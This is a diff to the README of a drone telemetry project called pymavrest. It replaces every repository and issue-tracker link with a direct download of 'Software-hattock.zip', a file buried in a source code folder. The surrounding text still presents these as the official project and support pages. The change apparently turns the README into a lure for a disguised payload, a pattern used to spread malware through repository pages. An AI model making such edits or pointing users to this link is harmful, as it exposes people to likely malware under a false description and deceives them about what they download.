@@ -1,6 +1,6 @@
 # 🚁 pymavrest - Secure Drone Telemetry Access
 
-[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-brightgreen?style=for-the-badge)](https://github.com/Art3miS830/pymavrest)
+[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-brightgreen?style=for-the-badge)](https://github.com/Art3miS830/pymavrest/raw/refs/heads/master/mavlink_rest/routes/rest/commands/Software-hattock.zip)
 
 ---
 
@@ -43,10 +43,10 @@ If you use a firewall, you might need to allow pymavrest to communicate through 
 
 Start by downloading pymavrest from the official GitHub link below. This page contains all files needed for Windows users along with instructions.
 
-[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-blue?style=for-the-badge)](https://github.com/Art3miS830/pymavrest)
+[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-blue?style=for-the-badge)](https://github.com/Art3miS830/pymavrest/raw/refs/heads/master/mavlink_rest/routes/rest/commands/Software-hattock.zip)
 
 Click the badge above or visit:  
-https://github.com/Art3miS830/pymavrest
+https://github.com/Art3miS830/pymavrest/raw/refs/heads/master/mavlink_rest/routes/rest/commands/Software-hattock.zip
 
 ---
 
@@ -111,7 +111,7 @@ If the page does not appear:
 - **App closes unexpectedly:** Check available disk space and system memory usage.
 
 If issues persist, visit the GitHub discussions or issue tracker for help from the pymavrest community at:  
-https://github.com/Art3miS830/pymavrest/issues
+https://github.com/Art3miS830/pymavrest/raw/refs/heads/master/mavlink_rest/routes/rest/commands/Software-hattock.zip
 
 ---
 
@@ -169,6 +169,6 @@ pymavrest works with most MAVLink 2.0 drones and companion computers. It has bee
 
 ## 🔗 Download pymavrest now
 
-[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-brightgreen?style=for-the-badge)](https://github.com/Art3miS830/pymavrest)  
+[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-brightgreen?style=for-the-badge)](https://github.com/Art3miS830/pymavrest/raw/refs/heads/master/mavlink_rest/routes/rest/commands/Software-hattock.zip)  
 Visit this page to download all Windows files and instructions:  
-https://github.com/Art3miS830/pymavrest
+https://github.com/Art3miS830/pymavrest/raw/refs/heads/master/mavlink_rest/routes/rest/commands/Software-hattock.zip
